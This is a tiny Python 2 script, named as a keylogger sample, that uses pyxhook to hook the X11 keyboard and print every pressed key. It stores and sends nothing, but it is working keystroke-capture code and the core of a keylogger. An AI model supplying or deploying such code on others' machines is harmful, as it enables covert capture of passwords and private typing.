# -*- coding: utf-8 -*-
# keylogger_sample2.py
import pyxhook

def OnKeyPress(event):
    print "Input Key: %c" % event.Key

new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()
new_hook.start()
